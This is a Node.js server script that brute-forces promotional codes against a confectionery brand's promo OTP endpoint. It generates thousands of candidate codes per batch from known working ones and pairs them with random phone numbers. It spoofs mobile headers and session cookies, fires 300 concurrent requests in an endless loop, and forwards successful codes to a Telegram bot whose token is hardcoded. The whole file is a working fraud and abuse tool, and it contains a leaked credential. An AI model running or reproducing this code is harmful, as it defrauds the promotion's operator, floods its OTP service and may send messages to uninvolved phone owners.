const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = "8468676540:AAFsb4SPSlAD-5dNUmbQARL5Sj9cXlO7Oac";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ═══════════════════════════════════════════════════════════════
//          EXACT PYTHON LOGIC - SMART BRUTEFORCER
// ═══════════════════════════════════════════════════════════════

class SmartPatternBruteforcer {
    constructor() {
        this.clients = new Set();
        this.chatId = null;
        this.successCodes = new Set();
        this.totalAttempts = 0;
        this.batchNum = 0;
        this.isRunning = false;
        
        // EXACT PYTHON WORKING CODES
        this.workingCodes = ["MTWCDY", "MY6BKC", "TPHV6T", "TH6HXF", "THBK38"];
        this.codePatterns = this.analyzeWorkingCodes();
        
        // EXACT PYTHON CONFIG
        this.baseUrl = "https://www.tictac.com";
        this.endpoint = "/in/en/xp/jarpecarpromo/home/generateOTP";
        
        // EXACT PYTHON USER AGENTS
        this.userAgents = [
            'Mozilla/5.0 (Linux; Android 15; V2315 Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
        ];
        
        // EXACT PYTHON BASE HEADERS
        this.baseHeaders = {
            'Host': 'www.tictac.com',
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': 'XMLHttpRequest',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'sec-ch-ua': '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://www.tictac.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=1, i'
        };
        
        this.initTelegram();
        this.startAutoRun();
    }
    
    async initTelegram() {
        try {
            const response = await axios.get(`${TELEGRAM_API}/getUpdates`, { timeout: 30000 });
            if (response.data.result && response.data.result.length > 0) {
                this.chatId = response.data.result[response.data.result.length - 1].message.chat.id;
                console.log('✅ Telegram connected:', this.chatId);
            }
        } catch (error) {
            console.log('⚠️  Telegram: Using fallback');
            this.chatId = 'me';
        }
    }
    
    analyzeWorkingCodes() {
        console.log('🔍 Analyzing working codes...');
        
        const patterns = {
            positionPatterns: {},
            charFrequencies: {},
            structurePatterns: [],
            prefixSuffix: { prefix: {}, suffix: {} }
        };
        
        // POSITION ANALYSIS - EXACT PYTHON LOGIC
        for (let position = 0; position < 6; position++) {
            const charsAtPos = this.workingCodes.map(code => code[position]);
            patterns.positionPatterns[position] = {
                letters: charsAtPos.filter(c => /[A-Z]/.test(c)),
                digits: charsAtPos.filter(c => /[0-9]/.test(c)),
                common: [...new Set(charsAtPos)]
            };
        }
        
        // CHARACTER FREQUENCY - EXACT PYTHON LOGIC
        const allChars = this.workingCodes.join('');
        for (const char of new Set(allChars)) {
            patterns.charFrequencies[char] = (allChars.match(new RegExp(char, 'g')) || []).length;
        }
        
        // STRUCTURE PATTERNS - EXACT PYTHON LOGIC
        for (const code of this.workingCodes) {
            const structure = code.split('').map(c => /[A-Z]/.test(c) ? 'L' : 'D').join('');
            patterns.structurePatterns.push(structure);
        }
        
        // PREFIX/SUFFIX - EXACT PYTHON LOGIC
        for (const code of this.workingCodes) {
            const prefix = code.slice(0, 2);
            const suffix = code.slice(-2);
            patterns.prefixSuffix.prefix[prefix] = (patterns.prefixSuffix.prefix[prefix] || 0) + 1;
            patterns.prefixSuffix.suffix[suffix] = (patterns.prefixSuffix.suffix[suffix] || 0) + 1;
        }
        
        console.log('✅ Pattern analysis complete!');
        console.log('📊 Structure patterns:', new Set(patterns.structurePatterns));
        console.log('📊 Char frequencies:', patterns.charFrequencies);
        console.log('📊 Prefix/Suffix:', patterns.prefixSuffix);
        
        return patterns;
    }
    
    generateSmartCodes5000() {
        // EXACT PYTHON LOGIC - GENERATE 5000 CODES
        const codes = new Set(this.workingCodes);
        
        // 1. START WITH WORKING CODES (DONE ABOVE)
        
        // 2. STRUCTURE-BASED GENERATION
        const structureWeights = {};
        for (const struct of this.codePatterns.structurePatterns) {
            structureWeights[struct] = (structureWeights[struct] || 0) + 1;
        }
        
        const totalWeight = Object.values(structureWeights).reduce((a, b) => a + b, 0);
        
        for (const [struct, weight] of Object.entries(structureWeights)) {
            const count = Math.floor(1000 * (weight / totalWeight));
            
            for (let i = 0; i < count; i++) {
                let code = '';
                for (const patternChar of struct) {
                    if (patternChar === 'L') {
                        const freqChars = Object.keys(this.codePatterns.charFrequencies);
                        if (freqChars.length > 0) {
                            code += freqChars[Math.floor(Math.random() * freqChars.length)];
                        } else {
                            code += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)];
                        }
                    } else {
                        code += Math.floor(Math.random() * 10);
                    }
                }
                codes.add(code);
            }
        }
        
        // 3. POSITION-SPECIFIC GENERATION
        for (let i = 0; i < 1200; i++) {
            let code = '';
            for (let pos = 0; pos < 6; pos++) {
                const posData = this.codePatterns.positionPatterns[pos];
                
                let availableChars = [];
                if (posData.letters) availableChars.push(...posData.letters);
                if (posData.digits) availableChars.push(...posData.digits);
                
                if (availableChars.length > 0) {
                    // Weighted random selection
                    const charWeights = {};
                    for (const char of availableChars) {
                        charWeights[char] = this.codePatterns.charFrequencies[char] || 1;
                    }
                    
                    const totalWeight = Object.values(charWeights).reduce((a, b) => a + b, 0);
                    if (totalWeight > 0) {
                        let r = Math.floor(Math.random() * totalWeight) + 1;
                        let cumulative = 0;
                        for (const [char, weight] of Object.entries(charWeights)) {
                            cumulative += weight;
                            if (r <= cumulative) {
                                code += char;
                                break;
                            }
                        }
                    } else {
                        code += availableChars[Math.floor(Math.random() * availableChars.length)];
                    }
                } else {
                    // Fallback to random
                    if (Math.random() < 0.7) {
                        code += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)];
                    } else {
                        code += Math.floor(Math.random() * 10);
                    }
                }
            }
            codes.add(code);
        }
        
        // 4. PREFIX/SUFFIX BASED
        const commonPrefixes = Object.keys(this.codePatterns.prefixSuffix.prefix);
        const commonSuffixes = Object.keys(this.codePatterns.prefixSuffix.suffix);
        
        for (let i = 0; i < 800; i++) {
            let prefix, suffix;
            
            if (commonPrefixes.length > 0) {
                prefix = commonPrefixes[Math.floor(Math.random() * commonPrefixes.length)];
            } else {
                prefix = Array(2).fill(0).map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)]).join('');
            }
            
            if (commonSuffixes.length > 0) {
                suffix = commonSuffixes[Math.floor(Math.random() * commonSuffixes.length)];
            } else {
                suffix = Array(2).fill(0).map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)]).join('');
            }
            
            // Generate middle 2 characters
            let middle = '';
            for (const pos of [2, 3]) {
                const posData = this.codePatterns.positionPatterns[pos];
                const available = [...posData.letters, ...posData.digits];
                if (available.length > 0) {
                    middle += available[Math.floor(Math.random() * available.length)];
                } else {
                    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                    middle += chars[Math.floor(Math.random() * chars.length)];
                }
            }
            
            codes.add(prefix + middle + suffix);
        }
        
        // 5. HIGH-FREQUENCY CHARACTER COMBINATIONS
        const freqChars = Object.entries(this.codePatterns.charFrequencies)
            .sort((a, b) => b[1] - a[1]);
        
        if (freqChars.length > 0) {
            const topChars = freqChars.slice(0, 8).map(([char]) => char);
            for (let i = 0; i < 600; i++) {
                if (topChars.length >= 6) {
                    const code = Array(6).fill(0).map(() => topChars[Math.floor(Math.random() * topChars.length)]).join('');
                    codes.add(code);
                }
            }
        }
        
        // 6. INTELLIGENT VARIATIONS OF WORKING CODES
        for (const workingCode of this.workingCodes) {
            for (let i = 0; i < 6; i++) {
                const posData = this.codePatterns.positionPatterns[i];
                const availableChars = [...posData.letters, ...posData.digits];
                
                if (availableChars.length > 0) {
                    for (const newChar of availableChars) {
                        if (newChar !== workingCode[i]) {
                            const newCode = workingCode.slice(0, i) + newChar + workingCode.slice(i + 1);
                            codes.add(newCode);
                        }
                    }
                }
            }
        }
        
        // 7. COMPLETE RANDOM (limited)
        while (codes.size < 5000) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            const code = Array(6).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
            codes.add(code);
        }
        
        const finalCodes = Array.from(codes).slice(0, 5000);
        console.log(`✅ Generated ${finalCodes.length} smart pattern-based codes`);
        return finalCodes;
    }
    
    generateRandomPhone() {
        // EXACT PYTHON LOGIC
        const prefixes = ['7', '8', '9', '6'];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const remaining = Array(9).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
        return prefix + remaining;
    }
    
    getHeaders() {
        // EXACT PYTHON LOGIC - COPY BASE HEADERS + RANDOM UA + RANDOM COOKIE
        const headers = { ...this.baseHeaders };
        headers['user-agent'] = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
        headers['cookie'] = `PHPSESSID=1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 900) + 100}`;
        return headers;
    }
    
    async makeRequest(code, phone) {
        // EXACT PYTHON LOGIC
        const url = `${this.baseUrl}${this.endpoint}`;
        const data = `phone=${phone}&ccode=${code}`;
        const headers = this.getHeaders();
        
        try {
            const response = await axios.post(url, data, {
                headers,
                timeout: 5000,
                maxRedirects: 0,
                validateStatus: (status) => status === 200
            });
            
            this.totalAttempts++;
            
            if (response.status === 200) {
                try {
                    const respData = response.data;
                    const respStr = JSON.stringify(respData).toLowerCase();
                    
                    if (respStr.includes('success')) {
                        this.successCodes.add(code);
                        return { code, phone, status: 'success', response: respData };
                    } else {
                        return { code, phone, status: 'failed', response: respData };
                    }
                } catch (e) {
                    return { code, phone, status: 'error', response: response.data };
                }
            }
        } catch (error) {
            return { code, phone, status: 'error', error: 'timeout' };
        }
        
        return null;
    }
    
    async sendSuccessToTelegram(code, phone) {
        if (!this.chatId) return false;
        
        const message = `
🎯 <b>SUCCESS CODE FOUND!</b>

🔑 <b>Code:</b> <code>${code}</code>
📱 <b>Phone:</b> <code>${phone}</code>
⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
📊 <b>Total Success:</b> ${this.successCodes.size} codes
        `.trim();
        
        try {
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            }, { timeout: 15000 });
            return true;
        } catch (error) {
            return false;
        }
    }
    
    broadcast(data) {
        const message = JSON.stringify(data);
        this.clients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(message);
            }
        });
    }
    
    async executeBatch() {
        this.batchNum++;
        const startTime = Date.now();
        
        console.log(`\n${'='.repeat(80)}`);
        console.log(`🧠 SMART BATCH #${this.batchNum} - PATTERN-BASED`);
        console.log('='.repeat(80));
        
        this.broadcast({
            type: 'batch_start',
            batch: this.batchNum,
            message: `🧠 BATCH #${this.batchNum} STARTED`
        });
        
        // GENERATE SMART CODES - EXACT PYTHON METHOD
        console.log('🧠 Generating pattern-based codes...');
        const codes = this.generateSmartCodes5000();
        console.log(`✅ Generated ${codes.length} smart codes`);
        
        // GENERATE PHONES - EXACT PYTHON METHOD
        console.log('📱 Generating random phones...');
        const phones = Array(5000).fill(0).map(() => this.generateRandomPhone());
        
        console.log('⚡ Launching 5000 smart requests...');
        console.log('🎯 Using analyzed patterns for better success rate...');
        console.log('='.repeat(80));
        
        this.broadcast({
            type: 'codes_generated',
            count: codes.length,
            message: `✅ Generated ${codes.length} smart codes`
        });
        
        let completed = 0;
        let successCount = 0;
        
        // EXACT PYTHON LOGIC - 300 CONCURRENT WORKERS
        const batchSize = 300;
        
        for (let i = 0; i < codes.length; i += batchSize) {
            const batch = codes.slice(i, i + batchSize);
            const phoneBatch = phones.slice(i, i + batchSize);
            
            const promises = batch.map((code, idx) => this.makeRequest(code, phoneBatch[idx]));
            const results = await Promise.allSettled(promises);
            
            for (const result of results) {
                if (result.status === 'fulfilled' && result.value) {
                    completed++;
                    
                    if (result.value.status === 'success') {
                        successCount++;
                        
                        console.log(`🎯 SUCCESS #${successCount}: ${result.value.code}`);
                        
                        this.broadcast({
                            type: 'success',
                            code: result.value.code,
                            phone: result.value.phone,
                            successCount,
                            batchNum: this.batchNum,
                            totalSuccess: this.successCodes.size,
                            message: `🎯 SUCCESS #${successCount}: ${result.value.code}`
                        });
                        
                        this.sendSuccessToTelegram(result.value.code, result.value.phone);
                    }
                    
                    // PROGRESS EVERY 1000 - EXACT PYTHON LOGIC
                    if (completed % 1000 === 0) {
                        console.log(`\n📊 Progress: ${completed}/5000 | Success: ${successCount}\n`);
                        
                        this.broadcast({
                            type: 'progress',
                            completed,
                            total: 5000,
                            successCount,
                            message: `📊 Progress: ${completed}/5000 | Success: ${successCount}`
                        });
                    }
                }
            }
        }
        
        const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
        
        console.log(`\n${'='.repeat(80)}`);
        console.log(`🧠 SMART BATCH #${this.batchNum} COMPLETED`);
        console.log('='.repeat(80));
        console.log(`⏱️  Time: ${timeTaken} seconds`);
        console.log(`🎯 Success: ${successCount} codes`);
        console.log(`📊 Success rate: ${successCount}/5000 (${(successCount/5000*100).toFixed(2)}%)`);
        console.log(`💾 Total working codes: ${this.successCodes.size}`);
        
        if (this.successCodes.size > 0) {
            console.log(`\n🎉 ALL WORKING CODES:`);
            const lastCodes = Array.from(this.successCodes).slice(-15);
            lastCodes.forEach((code, idx) => {
                console.log(`  ${idx + 1}. ${code}`);
            });
        }
        
        console.log(`\n🔄 Preparing next smart batch...`);
        
        this.broadcast({
            type: 'batch_complete',
            batch: this.batchNum,
            successCount,
            timeTaken,
            totalSuccess: this.successCodes.size,
            allCodes: Array.from(this.successCodes),
            message: `✅ Batch #${this.batchNum}: ${successCount} success in ${timeTaken}s`
        });
    }
    
    async startAutoRun() {
        this.isRunning = true;
        
        console.log('\n🔮 INFINITE SMART MODE ACTIVATED');
        console.log('🧠 Using analyzed patterns for maximum success');
        console.log('🎯 Only success codes → Telegram');
        console.log('💾 Auto-save enabled\n');
        
        while (this.isRunning) {
            await this.executeBatch();
            
            console.log('\n⏰ 15 second cooldown for next analysis...\n');
            
            this.broadcast({
                type: 'cooldown',
                message: '⏰ 15s cooldown before next batch...'
            });
            
            await new Promise(resolve => setTimeout(resolve, 15000));
        }
    }
    
    addClient(ws) {
        this.clients.add(ws);
        console.log(`✅ Client connected | Total: ${this.clients.size}`);
        
        ws.send(JSON.stringify({
            type: 'connected',
            message: '✅ Connected to smart bruteforcer',
            batchNum: this.batchNum,
            totalSuccess: this.successCodes.size,
            allCodes: Array.from(this.successCodes)
        }));
    }
    
    removeClient(ws) {
        this.clients.delete(ws);
        console.log(`❌ Client disconnected | Total: ${this.clients.size}`);
    }
}

// ═══════════════════════════════════════════════════════════════
//                    EXPRESS + WEBSOCKET SERVER
// ═══════════════════════════════════════════════════════════════

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// START GLOBAL BRUTEFORCER
const globalBruteforcer = new SmartPatternBruteforcer();

app.get('/', (req, res) => {
    res.json({
        status: 'running',
        mode: 'EXACT PYTHON LOGIC - AUTO-RUN 24/7',
        batchNum: globalBruteforcer.batchNum,
        totalSuccess: globalBruteforcer.successCodes.size,
        successCodes: Array.from(globalBruteforcer.successCodes),
        clients: globalBruteforcer.clients.size,
        message: '🔥 Smart pattern bruteforcer - Exact Python implementation'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

wss.on('connection', (ws) => {
    globalBruteforcer.addClient(ws);
    
    ws.on('close', () => {
        globalBruteforcer.removeClient(ws);
    });
});

server.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════════════════════╗
║     FIXED SMART PATTERN BRUTEFORCER 5000 - NODE.JS           ║
║                                                                ║
║  🧠 EXACT PYTHON LOGIC IMPLEMENTED                           ║
║  📊 All pattern analysis methods                             ║
║  🎯 Complete header replication                              ║
║  ⚡ 5000 smart codes per batch                               ║
║  🔄 300 concurrent workers                                   ║
║                                                                ║
║  🌐 Server: http://localhost:${PORT}                            ║
║  🔌 WebSocket: ACTIVE                                         ║
║  📱 Telegram: ${globalBruteforcer.chatId ? 'CONNECTED ✅' : 'PENDING ⏳'}                                    ║
║  ☁️  Render.com: READY                                        ║
╚════════════════════════════════════════════════════════════════╝
    `);
});
